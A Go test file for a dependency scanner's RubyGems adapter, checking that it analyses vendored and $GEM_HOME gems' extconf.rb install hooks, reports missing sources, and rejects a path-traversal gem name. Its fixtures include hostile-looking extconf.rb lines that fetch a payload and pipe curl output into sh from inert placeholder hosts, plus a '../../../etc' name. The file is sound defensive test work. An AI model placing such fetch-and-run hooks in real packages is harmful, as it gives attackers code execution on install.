package rubygems

import (
	"os"
	"path/filepath"
	"testing"

	"ihbv.io/depsnort/internal/ecosystem/instsurf"
	"ihbv.io/depsnort/internal/graph"
)

// D-148: transitive gems were never examined AND never disclosed — the adapter
// analyzed the root gem only, and a Gemfile.lock full of native-extension gems
// scanned as if every extconf.rb had been read and found clean. The classic
// rubygems supply-chain payload IS a dependency's extconf.rb, so this was the
// worst silent skip of the three ecosystems audited. Dependencies with locally
// installed source (Bundler's vendor path, $GEM_HOME) are now analyzed; the
// rest are disclosed as source-unavailable.

func d148Graph(t *testing.T, deps ...string) *graph.Graph {
	t.Helper()
	g := graph.New()
	root := g.AddNode(&graph.Node{ID: "pkg:gem/app", Kind: graph.KindPackage, Ecosystem: "gem", Name: "app"})
	g.MarkRoot(root.ID)
	for i := 0; i+1 < len(deps); i += 2 {
		n := g.AddNode(&graph.Node{
			ID: "pkg:gem/" + deps[i] + "@" + deps[i+1], Kind: graph.KindPackage,
			Ecosystem: "gem", Name: deps[i], Version: deps[i+1], Depth: 1,
		})
		g.AddEdge(root.ID, n.ID, graph.EdgeDependsOn)
	}
	return g
}

func d148Write(t *testing.T, dir, rel, content string) {
	t.Helper()
	p := filepath.Join(dir, rel)
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func d148Gaps(err error) []instsurf.Gap {
	var out []instsurf.Gap
	for _, g := range instsurf.GapsOf(err) {
		if g.Reason == instsurf.GapUnavailable {
			out = append(out, g)
		}
	}
	return out
}

// TestD148MissingDependencySourceIsDisclosed is the audit finding itself.
func TestD148MissingDependencySourceIsDisclosed(t *testing.T) {
	dir := t.TempDir()
	d148Write(t, dir, "Gemfile.lock", "GEM\n") // presence only; graph is built directly
	g := d148Graph(t, "ffi", "1.16.3", "sassc", "2.4.0")
	err := (&Adapter{}).ExtractInstallSurface(dir, g)
	if err == nil {
		t.Fatal("two dependency gems with no local source must surface as gaps")
	}
	if got := d148Gaps(err); len(got) != 2 {
		t.Fatalf("want 2 source-unavailable gaps, got %v", instsurf.GapsOf(err))
	}
}

// TestD148VendoredGemIsActuallyAnalyzed is the positive half — disclosure alone
// would be the minimum; the point of looking in Bundler's vendor path is that a
// hostile extconf.rb sitting there is READ. The IOCs are inert string literals
// (RFC 5737 TEST-NET-3 / .invalid).
func TestD148VendoredGemIsActuallyAnalyzed(t *testing.T) {
	dir := t.TempDir()
	d148Write(t, dir, "Gemfile.lock", "GEM\n")
	gemDir := "vendor/bundle/ruby/3.2.0/gems/evilgem-1.0.0"
	d148Write(t, dir, filepath.Join(gemDir, "extconf.rb"),
		"require 'open-uri'\nURI.open('http://203.0.113.7.invalid/payload').read\n")
	g := d148Graph(t, "evilgem", "1.0.0")

	err := (&Adapter{}).ExtractInstallSurface(dir, g)
	if len(d148Gaps(err)) != 0 {
		t.Errorf("the gem IS locally present; no source-unavailable gap is honest: %v", err)
	}
	if g.CountByKind()[graph.KindInstallHook] == 0 {
		t.Fatal("a vendored dependency's extconf.rb must produce a hook node")
	}
	// The hook must hang off the DEPENDENCY, not the root.
	dep := g.Get("pkg:gem/evilgem@1.0.0")
	attributed := false
	for _, e := range g.Edges {
		if e.From == dep.ID {
			attributed = true
			break
		}
	}
	if !attributed {
		t.Error("the hook must be attributed to the dependency node")
	}
}

// TestD148GemHomeIsSearchedToo: an explicit $GEM_HOME is the non-vendored
// install convention.
func TestD148GemHomeIsSearchedToo(t *testing.T) {
	proj, gemHome := t.TempDir(), t.TempDir()
	d148Write(t, proj, "Gemfile.lock", "GEM\n")
	d148Write(t, gemHome, "gems/homegem-2.0.0/extconf.rb",
		"system('curl http://203.0.113.9.invalid | sh')\n")
	t.Setenv("GEM_HOME", gemHome)
	g := d148Graph(t, "homegem", "2.0.0")
	err := (&Adapter{}).ExtractInstallSurface(proj, g)
	if len(d148Gaps(err)) != 0 {
		t.Errorf("gem present under $GEM_HOME; got %v", err)
	}
	if g.CountByKind()[graph.KindInstallHook] == 0 {
		t.Fatal("a $GEM_HOME dependency's extconf.rb must produce a hook node")
	}
}

// TestD148CleanVendoredGemProducesNoGapAndNoHook is the false-positive
// boundary: present, examined, boring.
func TestD148CleanVendoredGemProducesNoGapAndNoHook(t *testing.T) {
	dir := t.TempDir()
	d148Write(t, dir, "Gemfile.lock", "GEM\n")
	d148Write(t, dir, "vendor/bundle/ruby/3.2.0/gems/plain-1.0.0/lib/plain.rb", "module Plain; end\n")
	g := d148Graph(t, "plain", "1.0.0")
	err := (&Adapter{}).ExtractInstallSurface(dir, g)
	if len(d148Gaps(err)) != 0 {
		t.Errorf("a present pure-Ruby gem was examined in full, got %v", err)
	}
	if g.CountByKind()[graph.KindInstallHook] != 0 {
		t.Error("a gem with no extconf/gemspec/Rakefile must produce no hooks")
	}
}

// TestD148HostileLookupKeysAreRefused: name and version come from a parsed
// Gemfile.lock, which is attacker-authored input. A key that could steer the
// path join is a containment gap, never a lookup.
func TestD148HostileLookupKeysAreRefused(t *testing.T) {
	dir := t.TempDir()
	d148Write(t, dir, "Gemfile.lock", "GEM\n")
	g := d148Graph(t, "../../../etc", "1.0.0")
	err := (&Adapter{}).ExtractInstallSurface(dir, g)
	found := false
	for _, gp := range instsurf.GapsOf(err) {
		if gp.Reason == instsurf.GapContainment {
			found = true
		}
	}
	if !found {
		t.Errorf("a traversal name must be a containment gap, got %v", err)
	}
}
